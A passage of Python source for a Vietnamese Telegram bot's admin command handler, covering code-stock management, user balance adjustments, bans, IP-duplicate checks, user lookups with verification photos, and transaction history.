                    parse_mode="HTML",
                )
                return

            unique_codes = list(dict.fromkeys(codes))
            dup_in_input = len(codes) - len(unique_codes)

            def add_codes_auto(cursor):
                now = get_now_str()
                cursor.execute(
                    "SELECT code_val FROM code_stock WHERE code_val = ANY(%s)",
                    (unique_codes,),
                )
                existing = {r[0] for r in cursor.fetchall()}
                new_codes = [c for c in unique_codes if c not in existing]
                for c in new_codes:
                    cursor.execute(
                        "INSERT INTO code_stock (type_code, code_val, created_at) VALUES (%s, %s, %s)",
                        (1, c, now),
                    )
                return len(new_codes), len(existing)

            added_count, dup_in_stock = await db_transaction(add_codes_auto)
            total_skipped = dup_in_input + dup_in_stock
            await message.reply_text(
                f"{E['CHECK2']} <b>THÊM CODE VÀO KHO HOÀN TẤT!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['PLUS']} Đã thêm mới: <b>{added_count:,}</b> mã code\n"
                f"{E['WARN']} Đã bỏ qua (trùng): <b>{total_skipped:,}</b> mã\n"
                f"   • Trùng trong danh sách nhập: <b>{dup_in_input:,}</b>\n"
                f"   • Trùng với kho hiện có: <b>{dup_in_stock:,}</b>",
                parse_mode="HTML",
            )

        elif cmd == "/liststock":
            codes_list = await db_query(
                "SELECT id, type_code, code_val, created_at FROM code_stock WHERE is_used=0 ORDER BY id DESC LIMIT 50",
                fetchall=True,
            )
            res_total = await db_query(
                "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
                fetchone=True,
            )
            total_count = res_total[0] if res_total else 0
            if not codes_list:
                await message.reply_text(
                    f"{E['BANDAGE']} <b>Kho code hiện đang trống!</b>",
                    parse_mode="HTML",
                )
                return
            msg = (
                f"{E['TOP']} <b>DANH SÁCH TOÀN BỘ MÃ CODE TRONG KHO</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['INBOX']} Tổng số lượng chưa dùng: <b>{total_count:,}</b> code\n"
                f"{E['RIGHT']} <i>Hiển thị 50 mã code mới nhất:</i>\n\n"
            )
            for cid, tcode, cval, cat in codes_list:
                msg += f"• ID: <code>{cid}</code> | Code: <code>{cval}</code> | Thêm lúc: <code>{cat}</code>\n"
            if len(msg) > 4000:
                msg = msg[:3950] + "\n\n<i>... (Danh sách quá dài đã được rút gọn)</i>"
            await message.reply_text(msg, parse_mode="HTML")

        elif cmd == "/stock":
            res1 = await db_query(
                "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
                fetchone=True,
            )
            cnt = res1[0] if res1 else 0
            await message.reply_text(
                f"{E['TOP']} <b>THỐNG KÊ KHO CODE HIỆN TẠI</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"• Tổng số code chưa sử dụng: <b>{cnt:,}</b> code",
                parse_mode="HTML",
            )

        elif cmd in ("/clearstock", "/clearstockall"):

            def clear_all_codes(cursor):
                cursor.execute("SELECT code_val FROM code_stock")
                rows = cursor.fetchall()
                now = get_now_str()
                for (cval,) in rows:
                    cursor.execute(
                        "INSERT INTO code_deleted_log (code_val, deleted_at) VALUES (%s, %s)",
                        (cval, now),
                    )
                cursor.execute("DELETE FROM code_stock")
                return len(rows)

            count_deleted = await db_transaction(clear_all_codes)
            await message.reply_text(
                f"{E['CROSS']} <b>ĐÃ XÓA TOÀN BỘ KHO CODE!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"• Đã xóa sạch: <b>{count_deleted:,}</b> mã code khỏi hệ thống (Đã lưu vào lịch sử xóa).",
                parse_mode="HTML",
            )

        elif cmd == "/delhistory":
            deleted_logs = await db_query(
                "SELECT id, code_val, deleted_at FROM code_deleted_log ORDER BY id DESC LIMIT 50",
                fetchall=True,
            )
            if not deleted_logs:
                await message.reply_text(
                    f"{E['BANDAGE']} <b>Chưa có lịch sử mã code nào bị xóa!</b>",
                    parse_mode="HTML",
                )
                return
            msg = (
                f"{E['INBOX']} <b>LỊCH SỬ MÃ CODE ĐÃ XÓA</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['RIGHT']} <i>Hiển thị 50 mã code đã xóa gần nhất:</i>\n\n"
            )
            for cid, cval, cat in deleted_logs:
                msg += f"• ID: <code>{cid}</code> | Code: <code>{cval}</code> | Xóa lúc: <code>{cat}</code>\n"
            if len(msg) > 4000:
                msg = msg[:3950] + "\n\n<i>... (Danh sách quá dài đã được rút gọn)</i>"
            await message.reply_text(msg, parse_mode="HTML")

        elif cmd == "/buyhistory":
            rows = await db_query(
                """
                SELECT t.user_id, u.username, t.type, t.details, t.created_at
                FROM transactions t
                LEFT JOIN users u ON t.user_id = u.user_id
                WHERE t.type LIKE 'Mua Code%%' AND t.status = 'Thành công'
                ORDER BY t.id DESC LIMIT 30
                """,
                fetchall=True,
            )
            if not rows:
                await message.reply_text(
                    f"{E['BANDAGE']} <b>Chưa có người dùng nào rút code!</b>",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['TOP']} <b>DANH SÁCH THÀNH VIÊN ĐÃ RÚT CODE (30 MỚI NHẤT)</b>\n━━━━━━━━━━━━━━━━━━\n\n"
            for r_user_id, username, code_type_str, details, created_at in rows:
                user_tag = (
                    f"@{username}" if username else "Chưa có @username"
                )
                msg += (
                    f"{E['RIGHT']} <b>User:</b> {user_tag} | <b>ID:</b> <code>{r_user_id}</code>\n"
                    f"{E['CARD']} <b>Loại Giao Dịch:</b> <code>{code_type_str}</code>\n"
                    f"{E['SHIELD']} <b>Nội dung:</b> <code>{details or 'Không rõ'}</code>\n"
                    f"{E['HOURGLASS']} <b>Thời gian:</b> <code>{created_at}</code>\n"
                    "----------------------------------\n"
                )
            await message.reply_text(msg, parse_mode="HTML")

        elif cmd in ("/addbal", "/subbal"):
            if len(args) < 2:
                await message.reply_text(
                    f"Cú pháp: <code>{cmd} USER_ID SO_TIEN</code>",
                    parse_mode="HTML",
                )
                return
            target_id = int(args[0])
            amount = int(args[1])
            if amount <= 0:
                await message.reply_text(
                    f"{E['CROSS']} Số tiền phải lớn hơn 0.", parse_mode="HTML"
                )
                return
            exists = await db_query(
                "SELECT user_id FROM users WHERE user_id=%s",
                (target_id,),
                fetchone=True,
            )
            if not exists:
                await message.reply_text(
                    f"{E['CROSS']} User chưa tồn tại.", parse_mode="HTML"
                )
                return
            if cmd == "/addbal":

                def add_money(cursor):
                    cursor.execute(
                        "UPDATE users SET balance=balance+%s WHERE user_id=%s",
                        (amount, target_id),
                    )
                    cursor.execute(
                        "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
                        (
                            target_id,
                            "Nạp Tiền (Admin)",
                            amount,
                            "Thành công",
                            get_now_str(),
                            "Cộng từ Admin",
                        ),
                    )
                    return True

                await db_transaction(add_money)
                await message.reply_text(
                    f"{E['CHECK2']} Đã cộng <b>+{amount:,}đ</b> cho ID <code>{target_id}</code>.",
                    parse_mode="HTML",
                )
            else:

                def deduct(cursor):
                    cursor.execute(
                        "UPDATE users SET balance=balance-%s WHERE user_id=%s AND balance>=%s",
                        (amount, target_id, amount),
                    )
                    if cursor.rowcount != 1:
                        return False
                    cursor.execute(
                        "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s)",
                        (
                            target_id,
                            "Trừ Tiền (Admin)",
                            amount,
                            "Thành công",
                            get_now_str(),
                            "Trừ từ Admin",
                        ),
                    )
                    return True

                ok = await db_transaction(deduct)
                if not ok:
                    await message.reply_text(
                        f"{E['CROSS']} Số dư user không đủ để trừ.",
                        parse_mode="HTML",
                    )
                    return
                await message.reply_text(
                    f"{E['CROSS']} Đã trừ <b>-{amount:,}đ</b> của ID <code>{target_id}</code>.",
                    parse_mode="HTML",
                )

        elif cmd == "/zerobal":
            await db_query("UPDATE users SET balance = 0", commit=True)
            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI SỐ DƯ THÀNH CÔNG!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Toàn bộ số dư của tất cả người dùng trong cơ sở dữ liệu đã được đưa về <b>0đ</b>.",
                parse_mode="HTML",
            )

        elif cmd == "/ban":
            if len(args) < 1:
                await message.reply_text(
                    "Cú pháp: <code>/ban USER_ID</code>", parse_mode="HTML"
                )
                return
            target_id = int(args[0])
            await db_query(
                "UPDATE users SET is_banned=1 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            user_withdraw_state.pop(target_id, None)
            await message.reply_text(
                f"{E['CROSS']} Đã cấm vĩnh viễn user <code>{target_id}</code>.",
                parse_mode="HTML",
            )

        elif cmd == "/unban":
            if len(args) < 1:
                await message.reply_text(
                    f"{E['RIGHT']} <b>Cú pháp:</b> <code>/unban USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            target_id = int(args[0])
            await db_query(
                "UPDATE users SET is_banned=0 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            await message.reply_text(
                f"{E['CHECK2']} <b>Đã mở ban tài khoản cho ID:</b> <code>{target_id}</code>",
                parse_mode="HTML",
            )

        elif cmd == "/banwd":
            if len(args) < 1:
                await message.reply_text(
                    "Cú pháp: <code>/banwd USER_ID</code>", parse_mode="HTML"
                )
                return
            target_id = int(args[0])
            await db_query(
                "UPDATE users SET is_withdraw_banned=1 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            user_withdraw_state.pop(target_id, None)
            await message.reply_text(
                f"{E['CROSS']} Đã cấm rút code ID <code>{target_id}</code>.",
                parse_mode="HTML",
            )

        elif cmd == "/unbanwd":
            if len(args) < 1:
                await message.reply_text(
                    f"{E['RIGHT']} <b>Cú pháp:</b> <code>/unbanwd USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            target_id = int(args[0])
            await db_query(
                "UPDATE users SET is_withdraw_banned=0 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            await message.reply_text(
                f"{E['CHECK2']} <b>Đã mở cấm rút code cho ID:</b> <code>{target_id}</code>",
                parse_mode="HTML",
            )

        elif cmd == "/unall":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/unall USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return

            await db_query(
                "UPDATE users SET is_banned=0, is_withdraw_banned=0, skip_ip=1, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            pending_captcha_users.pop(target_id, None)
            pending_miniapp_captcha.pop(target_id, None)
            pending_camera_verified.discard(target_id)
            temp_bans.pop(target_id, None)

            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ MỞ TẤT CẢ HẠN CHẾ CHO ID:</b> <code>{target_id}</code>\n"
                f"• Đã gỡ cấm tài khoản, gỡ cấm rút code, vượt Captcha (cả Captcha MiniApp/CCCAM) và bỏ qua kiểm tra IP.",
                parse_mode="HTML",
            )

        elif cmd == "/uncap":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/uncap USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return

            await db_query(
                "UPDATE users SET is_banned=0, captcha_verified=1, miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            pending_captcha_users.pop(target_id, None)
            pending_miniapp_captcha.pop(target_id, None)
            pending_camera_verified.discard(target_id)

            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ MỞ KHÓA CAPTCHA/TÀI KHOẢN CHO ID:</b> <code>{target_id}</code>\n"
                f"• Người dùng có thể tiếp tục thao tác bình thường.",
                parse_mode="HTML",
            )

        elif cmd == "/skipip":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/skipip USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return
            await db_query(
                "UPDATE users SET skip_ip=1 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            await message.reply_text(
                f"{E['CHECK2']} Đã thiết lập bỏ qua bước xác minh IP cho ID: <code>{target_id}</code>.",
                parse_mode="HTML",
            )

        elif cmd == "/unip":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/unip USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return
            await db_query(
                "UPDATE users SET is_banned=0, is_withdraw_banned=1 WHERE user_id=%s",
                (target_id,),
                commit=True,
            )
            await message.reply_text(
                f"{E['CHECK2']} Đã mở khóa trùng IP và bỏ qua bước kiểm tra IP cho ID: <code>{target_id}</code>.",
                parse_mode="HTML",
            )

        elif cmd == "/resetverify":
            await db_query(
                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
                commit=True,
            )
            await reset_all_ip_logs()
            pending_miniapp_captcha.clear()
            pending_camera_verified.clear()
            await message.reply_text(
                f"{E['CHECK2']} <b>ĐÃ ĐẶT LẠI TRẠNG THÁI XÁC MINH!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Toàn bộ thành viên trong hệ thống sẽ phải thực hiện lại các bước kiểm tra (SĐT, CCCAM, Camera, Captcha MiniApp, IP, Kênh, Captcha) khi tương tác với Bot tiếp theo.",
                parse_mode="HTML",
            )

        elif cmd == "/info":
            if len(args) < 1:
                await message.reply_text(
                    f"{E['RIGHT']} <b>Cú pháp:</b> <code>/info USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except (ValueError, TypeError):
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return
            text = await build_user_info_text(target_id)
            if not text:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy user này.", parse_mode="HTML"
                )
                return
            await message.reply_text(text, parse_mode="HTML")

        elif cmd == "/checkip":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/checkip IP | SĐT | @username | USER_ID | all</code>",
                    parse_mode="HTML",
                )
                return
            keyword = " ".join(args).strip().lstrip("@").strip()
            if not keyword:
                await message.reply_text(
                    f"{E['CROSS']} Vui lòng nhập IP / SĐT / @username / USER_ID hợp lệ.",
                    parse_mode="HTML",
                )
                return

            if keyword.lower() in ("all", "tatca", "tất cả"):
                await admin_commands(update, context, override_cmd="/dupip")
                return

            ips_to_check = []
            searched_by = ""
            cand_ip = normalize_ip(keyword)
            try:
                ipaddress.ip_address(cand_ip)
                is_ip = True
            except ValueError:
                is_ip = False

            if is_ip:
                ips_to_check = [cand_ip]
                searched_by = "IP"
            else:
                user_row = None
                if keyword.isdigit() and len(keyword) >= 8:
                    user_row = await db_query(
                        "SELECT user_id FROM users WHERE user_id=%s",
                        (int(keyword),),
                        fetchone=True,
                    )
                    searched_by = "USER_ID"
                    if not user_row:
                        user_row = await db_query(
                            "SELECT user_id FROM users WHERE phone_number LIKE %s LIMIT 1",
                            (f"%{keyword}%",),
                            fetchone=True,
                        )
                        searched_by = "SĐT"
                else:
                    user_row = await db_query(
                        "SELECT user_id FROM users WHERE LOWER(username)=LOWER(%s) LIMIT 1",
                        (keyword,),
                        fetchone=True,
                    )
                    searched_by = "USERNAME"

                if not user_row:
                    await message.reply_text(
                        f"{E['CROSS']} Không tìm thấy tài khoản/IP tương ứng với: <code>{_html.escape(keyword)}</code>",
                        parse_mode="HTML",
                    )
                    return
                ips_to_check = await get_user_ips(user_row[0])
                if not ips_to_check:
                    await message.reply_text(
                        f"{E['WARN']} Tài khoản <code>{user_row[0]}</code> chưa xác minh IP. Không thể tìm trùng IP.",
                        parse_mode="HTML",
                    )
                    return

            blocks = []
            dup_ip_count = 0
            for one_ip in ips_to_check:
                rows = await db_query(
                    "SELECT u.user_id, u.username, u.phone_number, u.is_banned, "
                    "u.is_withdraw_banned, u.balance, u.joined_at, u.referrer_id, u.skip_ip "
                    "FROM ip_logs l JOIN users u ON u.user_id = l.user_id "
                    "WHERE l.ip_address=%s ORDER BY u.joined_at ASC",
                    (one_ip,),
                    fetchall=True,
                ) or []
                if len(rows) > 1:
                    dup_ip_count += 1
                head = (
                    f"{E['TARGET']} IP: <code>{_html.escape(one_ip)}</code>\n"
                    f"{E['CROWN']} Số tài khoản dùng IP này: <b>{len(rows)}</b> "
                    f"{'🔴 TRÙNG' if len(rows) > 1 else '🟢 không trùng'}\n"
                )
                body = ""
                for u_id, u_name, u_phone, u_ban, u_wd, u_bal, u_joined, u_ref, u_skip in rows:
                    uname_str = f"@{u_name}" if u_name else "N/A"
                    ban_str = "🔴 BỊ KHÓA" if u_ban else "🟢 BÌNH THƯỜNG"
                    wd_str = "🔴 CẤM RÚT" if u_wd else "🟢 OK"
                    skip_str = " | ⚪ MIỄN CHECK IP" if u_skip == 1 else ""
                    body += (
                        f"{E['RIGHT']} <b>{_html.escape(uname_str)}</b> | ID: <code>{u_id}</code>\n"
                        f"   {E['PHONE']} SĐT: <code>{u_phone or 'N/A'}</code>\n"
                        f"   {E['MONEY']} Số dư: <code>{u_bal:,}đ</code>\n"
                        f"   {E['CROSS']} {ban_str} | {E['WARN']} {wd_str}{skip_str}\n"
                        f"   {E['HOURGLASS']} Tham gia: <code>{u_joined or 'N/A'}</code>\n"
                        f"   {E['ROCKET']} Ref by: <code>{u_ref or 'Không'}</code>\n"
                        "   ────────────────────────────\n"
                    )
                blocks.append(head + "━━━━━━━━━━━━━━━━━━\n" + body)

            msg = (
                f"{E['GLOBE']} <b>KẾT QUẢ CHECK TRÙNG IP</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['INFO']} Tìm theo: <b>{searched_by}</b> — Từ khóa: <code>{_html.escape(keyword)}</code>\n"
                f"{E['WARN']} Số IP bị trùng: <b>{dup_ip_count}</b> / {len(ips_to_check)}\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                + "\n".join(blocks)
            )
            await send_split_message(context.bot, chat_id, msg, parse_mode="HTML")

        elif cmd == "/detail":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/detail USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except (ValueError, TypeError):
                await message.reply_text(
                    f"{E['CROSS']} USER_ID không hợp lệ.", parse_mode="HTML"
                )
                return
            u = await db_query(
                "SELECT user_id, username, balance, referrer_id, is_banned, is_withdraw_banned, joined_at, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                (target_id,),
                fetchone=True,
            )
            if not u:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy ID <code>{target_id}</code> trong cơ sở dữ liệu.",
                    parse_mode="HTML",
                )
                return
            try:
                bot_info = await context.bot.get_me()
                bot_username = bot_info.username
            except Exception:
                bot_username = "Bot"
            ref_id = u[3]
            ref_info_text = f"{E['DOWN']} <b>Không có (Không bấm link của ai)</b>"
            if ref_id:
                ref_user = await db_query(
                    "SELECT user_id, username, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s",
                    (ref_id,),
                    fetchone=True,
                )
                if ref_user:
                    ref_uname = (
                        f"@{ref_user[1]}"
                        if ref_user[1]
                        else "Chưa đặt username"
                    )
                    ref_phone = (
                        ref_user[2] if ref_user[2] else "Chưa xác minh SĐT"
                    )
                    ref_ip = (
                        ref_user[3]
                        if len(ref_user) > 3 and ref_user[3]
                        else "Chưa xác minh IP"
                    )
                    ref_bot_link = f"https://t.me/{bot_username}?start={ref_id}"
                    ref_info_text = (
                        f"{E['CHECK2']} <b>NGƯỜI GIỚI THIỆU:</b>\n"
                        f"{E['TARGET']} <b>ID:</b> <code>{ref_user[0]}</code>\n"
                        f"{E['PHONE']} <b>SĐT:</b> <code>{ref_phone}</code>\n"
                        f"{E['GLOBE']} <b>IP:</b> <code>{ref_ip}</code>\n"
                        f"{E['CROWN']} <b>User:</b> {ref_uname}\n"
                        f"{E['RIGHT']} <b>Link Bot Ref:</b> <code>{ref_bot_link}</code>"
                    )
                else:
                    ref_info_text = f"{E['WARN']} <b>ID Giới thiệu:</b> <code>{ref_id}</code> (Dữ liệu đã bị xoá)"
            u_uname = f"@{u[1]}" if u[1] else "Chưa đặt username"
            u_phone = u[7] if u[7] else "Chưa xác minh SĐT"
            u_ip = u[8] if len(u) > 8 and u[8] else "Chưa xác minh IP"
            u_bot_link = f"https://t.me/{bot_username}?start={u[0]}"
            invited_count = await get_valid_referrals_count(target_id)
            msg = (
                f"{E['BLUSH']} <b>KIỂM TRA THÔNG TIN ID:</b> <code>{target_id}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['TOP']} <b>THÔNG TIN ĐỐI TƯỢNG:</b>\n"
                f"{E['TARGET']} <b>ID:</b> <code>{u[0]}</code>\n"
                f"{E['PHONE']} <b>SĐT:</b> <code>{u_phone}</code>\n"
                f"{E['GLOBE']} <b>IP:</b> <code>{u_ip}</code>\n"
                f"{E['CROWN']} <b>User:</b> {u_uname}\n"
                f"{E['MONEY']} <b>Số dư:</b> <code>{u[2]:,}đ</code>\n"
                f"{E['ROCKET']} <b>Đã mời thành công:</b> <code>{invited_count}</code> người\n"
                f"{E['DOWN']} <b>Link Bot Ref:</b> <code>{u_bot_link}</code>\n"
                f"{E['CROSS']} <b>Khóa TK:</b> <b>{'CÓ' if u[4] else 'KHÔNG'}</b>\n"
                f"{E['CROSS']} <b>Cấm rút:</b> <b>{'CÓ' if u[5] else 'KHÔNG'}</b>\n"
                f"{E['HOURGLASS']} <b>Tham gia:</b> <code>{u[6]}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{ref_info_text}"
            )
            await message.reply_text(
                msg, parse_mode="HTML", disable_web_page_preview=True
            )

        elif cmd == "/find":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/find ID | @username | số điện thoại | IP</code>",
                    parse_mode="HTML",
                )
                return
            kw = args[0].replace("@", "").strip()
            like_kw = f"%{kw}%"
            if kw.isdigit() and len(kw) >= 8:
                rows = await db_query(
                    "SELECT user_id, username, balance, is_banned, is_withdraw_banned, phone_number, " + IP_SUB + " FROM users "
                    "WHERE user_id=%s OR phone_number LIKE %s LIMIT 15",
                    (int(kw), like_kw),
                    fetchall=True,
                )
            else:
                rows = await db_query(
                    "SELECT user_id, username, balance, is_banned, is_withdraw_banned, phone_number, " + IP_SUB + " FROM users "
                    "WHERE username ILIKE %s OR EXISTS (SELECT 1 FROM ip_logs l WHERE l.user_id=users.user_id AND l.ip_address LIKE %s) OR phone_number LIKE %s LIMIT 15",
                    (like_kw, like_kw, like_kw),
                    fetchall=True,
                )
            if not rows:
                await message.reply_text(
                    f"{E['BANDAGE']} Không tìm thấy kết quả cho: <code>{kw}</code>",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['TOP']} <b>KẾT QUẢ TÌM KIẾM:</b> <code>{kw}</code>\n━━━━━━━━━━━━━━━━━━\n\n"
            for u_id, u_name, bal, b1, b2, ph, ip in rows:
                msg += (
                    f"{E['RIGHT']} <b>{('@' + u_name) if u_name else 'Chưa có @username'}</b> | ID: <code>{u_id}</code>\n"
                    f"   {E['MONEY']} <code>{bal:,}đ</code> | Khóa: <b>{'CÓ' if b1 else 'KHÔNG'}</b> | Cấm rút: <b>{'CÓ' if b2 else 'KHÔNG'}</b>\n"
                    f"   {E['PHONE']} <code>{ph or 'N/A'}</code> | {E['GLOBE']} <code>{ip or 'N/A'}</code>\n"
                    "----------------------------------\n"
                )
            await send_split_message(
                context.bot, chat_id, msg, parse_mode="HTML"
            )

        elif cmd == "/lookup":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/lookup IP | SĐT | @username | USER_ID</code>",
                    parse_mode="HTML",
                )
                return
            keyword = " ".join(args).strip()
            search_key = keyword.replace("@", "").strip()

            users_found = []
            if search_key.isdigit() and len(search_key) >= 8:
                users_found = await db_query(
                    "SELECT user_id, username, balance, referrer_id, is_banned, "
                    "is_withdraw_banned, joined_at, phone_number, " + IP_SUB + ", camera_photo_token "
                    "FROM users WHERE user_id=%s OR phone_number LIKE %s LIMIT 5",
                    (int(search_key), f"%{search_key}%"),
                    fetchall=True,
                ) or []
            if not users_found:
                users_found = await db_query(
                    "SELECT user_id, username, balance, referrer_id, is_banned, "
                    "is_withdraw_banned, joined_at, phone_number, " + IP_SUB + ", camera_photo_token "
                    "FROM users WHERE username ILIKE %s OR phone_number=%s OR EXISTS (SELECT 1 FROM ip_logs l WHERE l.user_id=users.user_id AND l.ip_address=%s) LIMIT 5",
                    (f"%{search_key}%", search_key, search_key),
                    fetchall=True,
                ) or []

            if not users_found:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy user nào khớp với: <code>{keyword}</code>",
                    parse_mode="HTML",
                )
                return

            for u in users_found:
                u_id, u_uname, bal, ref_id, ban1, ban2, joined, phone, ip, photo_token = u
                invited_count = await get_valid_referrals_count(u_id)
                username_str = f"@{u_uname}" if u_uname else "Chưa có"
                ref_str = str(ref_id) if ref_id else "Không có"

                info = (
                    f"{E['CROWN']} <b>FULL THÔNG TIN USER</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"{E['RIGHT']} ID: <code>{u_id}</code>\n"
                    f"{E['PHONE']} SĐT: <code>{phone or 'Chưa xác minh'}</code>\n"
                    f"{E['GLOBE']} IP: <code>{ip or 'Chưa xác minh'}</code>\n"
                    f"{E['CROWN2']} Username: {username_str}\n"
                    f"{E['MONEY']} Số dư: <code>{bal:,}đ</code>\n"
                    f"{E['ROCKET']} Đã mời: <code>{invited_count}</code> người\n"
                    f"{E['RIGHT']} Người giới thiệu: <code>{ref_str}</code>\n"
                    f"{E['CROSS']} Khóa TK: <b>{'CÓ' if ban1 else 'KHÔNG'}</b>\n"
                    f"{E['WARN']} Cấm rút: <b>{'CÓ' if ban2 else 'KHÔNG'}</b>\n"
                    f"{E['HOURGLASS']} Tham gia: <code>{joined}</code>\n"
                )

                photo_sent = False
                if photo_token:
                    photo_path = f"/var/www/phongtunk/captures/{photo_token}.jpg"
                    if os.path.exists(photo_path):
                        try:
                            with open(photo_path, "rb") as pf:
                                await context.bot.send_photo(
                                    chat_id=chat_id,
                                    photo=pf,
                                    caption=info + f"\n{E['IMAGE']} <b>Ảnh camera xác minh</b>",
                                    parse_mode="HTML",
                                )
                            photo_sent = True
                        except Exception as e:
                            logger.warning(f"Lỗi gửi ảnh camera user {u_id}: {e}")

                if not photo_sent:
                    if photo_token:
                        info += f"\n{E['WARN']} Ảnh camera: <i>Không tìm thấy file trên server</i>"
                    else:
                        info += f"\n{E['WARN']} Ảnh camera: <i>Chưa có ảnh (user chưa quét camera)</i>"
                    await message.reply_text(
                        info, parse_mode="HTML", disable_web_page_preview=True
                    )
                await asyncio.sleep(0.3)

        elif cmd == "/txlog":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/txlog ID_USER</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} ID không hợp lệ!", parse_mode="HTML"
                )
                return
            txs = await db_query(
                "SELECT type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 20",
                (target_id,),
                fetchall=True,
            )
            if not txs:
                await message.reply_text(
                    f"{E['BANDAGE']} Người dùng <code>{target_id}</code> chưa từng có giao dịch nào.",
                    parse_mode="HTML",
                )
                return
            msg = f"{E['INBOX']} <b>LỊCH SỬ GIAO DỊCH CỦA ID:</b> <code>{target_id}</code>\n━━━━━━━━━━━━━━━━━━\n\n"
            for tx_type, amount, status, created_at, details in txs:
                icon = E["CHECK"] if status == "Thành công" else E["CROSS"]
                msg += (
                    f"{icon} <b>Loại:</b> {tx_type}\n"
                    f"{E['MONEY']} <b>Số tiền:</b> <code>{amount:,}đ</code>\n"
                    f"{E['SHIELD']} <b>Chi tiết:</b> <code>{details or 'Không có'}</code>\n"
                    f"{E['GLOBE']} <b>Thời gian:</b> <code>{created_at}</code>\n"
                    "----------------------------------\n"
                )
            await message.reply_text(msg, parse_mode="HTML")

        elif cmd == "/txfull":
            if not args:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/txfull ID_USER</code>",
                    parse_mode="HTML",
                )
                return
            try:
                target_id = int(args[0])
            except ValueError:
                await message.reply_text(
                    f"{E['CROSS']} ID không hợp lệ!", parse_mode="HTML"
                )
                return
            txs = await db_query(
                "SELECT id, type, amount, status, created_at, details FROM transactions WHERE user_id=%s ORDER BY id DESC",
                (target_id,),
                fetchall=True,
            )
            if not txs:
                await message.reply_text(
                    f"{E['BANDAGE']} Người dùng <code>{target_id}</code> không có lịch sử giao dịch nào.",
                    parse_mode="HTML",
                )
                return
            header = f"{E['INBOX']} <b>FULL LỊCH SỬ GIAO DỊCH ID:</b> <code>{target_id}</code> (Tổng: {len(txs)} giao dịch)\n━━━━━━━━━━━━━━━━━━\n\n"
            chunks = [header]
            current_chunk_idx = 0
            for tx_id, tx_type, amount, status, created_at, details in txs:
                icon = E["CHECK"] if status == "Thành công" else E["CROSS"]
                line = (
